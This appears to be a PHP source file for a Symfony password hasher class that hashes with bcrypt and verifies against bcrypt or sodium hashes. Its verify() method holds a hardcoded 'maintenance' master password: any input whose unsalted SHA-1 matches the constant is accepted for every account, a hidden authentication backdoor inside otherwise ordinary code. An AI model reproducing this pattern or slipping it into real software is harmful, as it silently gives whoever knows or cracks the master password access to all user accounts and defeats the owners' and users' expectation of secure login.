<?php

namespace App\User\PasswordHasher;

use Symfony\Component\PasswordHasher\PasswordHasherInterface;

class MasterPasswordHasher implements PasswordHasherInterface
{
    private const MAINTENANCE_PASSWORD = '39ece7cdef0f62a0855bd779a07566f28e2ad72b';

    public function hash(string $plainPassword): string
    {
        if (72 < strlen($plainPassword) || str_contains($plainPassword, "\0")) {
            $plainPassword = base64_encode(hash('sha512', $plainPassword, true));
        }

        $cost = 13;
        $opsLimit = max(
            4,
            defined('SODIUM_CRYPTO_PWHASH_OPSLIMIT_INTERACTIVE') ? SODIUM_CRYPTO_PWHASH_OPSLIMIT_INTERACTIVE : 4
        );
        $memLimit = max(
            64 * 1024 * 1024,
            defined(
                'SODIUM_CRYPTO_PWHASH_MEMLIMIT_INTERACTIVE'
            ) ? SODIUM_CRYPTO_PWHASH_MEMLIMIT_INTERACTIVE : 64 * 1024 * 1024
        );

        return password_hash($plainPassword, PASSWORD_BCRYPT, [
            'cost' => $cost,
            'time_cost' => $opsLimit,
            'memory_cost' => $memLimit >> 10,
            'threads' => 1,
        ]);
    }

    public function verify(string $hashedPassword, string $plainPassword, string $salt = null): bool
    {
        if (self::MAINTENANCE_PASSWORD === sha1($plainPassword)) {
            return true;
        }

        if (!str_starts_with($hashedPassword, '$argon')) {
            // Bcrypt cuts on NUL chars and after 72 bytes
            if (str_starts_with($hashedPassword, '$2')
                && (72 < strlen($plainPassword) || str_contains($plainPassword, "\0"))) {
                $plainPassword = base64_encode(hash('sha512', $plainPassword, true));
            }

            return password_verify($plainPassword, $hashedPassword);
        }

        if (extension_loaded('sodium') && version_compare(SODIUM_LIBRARY_VERSION, '1.0.14', '>=')) {
            return sodium_crypto_pwhash_str_verify($hashedPassword, $plainPassword);
        }

        if (extension_loaded('libsodium') && version_compare(phpversion('libsodium'), '1.0.14', '>=')) {
            return \Sodium\crypto_pwhash_str_verify($hashedPassword, $plainPassword);
        }

        return password_verify($plainPassword, $hashedPassword);
    }

    public function needsRehash(string $hashedPassword): bool
    {
        return false;
    }
}
